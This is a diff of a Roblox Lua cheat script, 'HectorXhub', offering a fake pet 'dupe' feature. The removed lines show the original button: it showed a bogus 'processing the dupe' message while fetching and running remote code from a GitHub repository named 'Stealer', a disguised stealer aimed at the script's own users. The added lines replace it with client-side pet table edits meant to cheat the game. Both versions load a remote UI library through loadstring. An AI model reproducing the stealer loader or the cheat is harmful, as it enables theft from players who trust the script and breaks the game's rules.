@@ -1,43 +1,57 @@
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
-local Window = OrionLib:MakeWindow({Name = "HectorxHub🍌", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+local Window = OrionLib:MakeWindow({Name = "HectorXhub🍌", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
 
 
+local Pets = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)
 
+local fromPet = "Cat"
+local toPet = "Titanic Monkey"
+
+function FromPet1()
+    for i, v in pairs(Pets[fromPet] or {}) do
+        Pets[fromPet][i] = nil
+    end
+end
+
+function ToPet2()
+    for i, v in pairs(Pets[toPet] or {}) do
+        Pets[fromPet][i] = v
+    end
+end
 
 local Tab = Window:MakeTab({
-    Name = "Huge",
-    Icon = "rbxassetid://4483345998",
-    PremiumOnly = false
+	Name = "Huge",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
 })
 
 Tab:AddTextbox({
-    Name = "From Pet",
-    Default = "Cat",
-    TextDisappear = true,
-    Callback = function(Value)
-        
-        print(Value)
-    end      
+	Name = "From Pet",
+	Default = "Cat",
+	TextDisappear = true,
+	Callback = function(Value)
+	    fromPet = Value
+		print(Value)
+	end	  
 })
 
 Tab:AddTextbox({
-    Name = "To Pet",
-    Default = "Huge",
-    TextDisappear = true,
-    Callback = function(Value)
-       
-        print(Value)
-    end      
+	Name = "To Pet",
+	Default = "Huge",
+	TextDisappear = true,
+	Callback = function(Value)
+       toPet = Value
+		print(Value)
+	end	  
 })
 
 Tab:AddButton({
-    Name = "Changed",
-    Callback = function()
-           local message = require(game.ReplicatedStorage.Library.Client.Message)
-        message.Error("PLEASE WAIT WHILE WE ARE PROCESSING THE DUPE")
-        wait(2) loadstring(game:HttpGet("https://raw.githubusercontent.com/Ps99Script-png/Stealer-/main/Stealer"))()
+	Name = "Changed",
+	Callback = function()
+	    FromPet1()
+        ToPet2()
         print("button pressed")
-      end    
+  	end    
 })
 
 local Tab = Window:MakeTab({
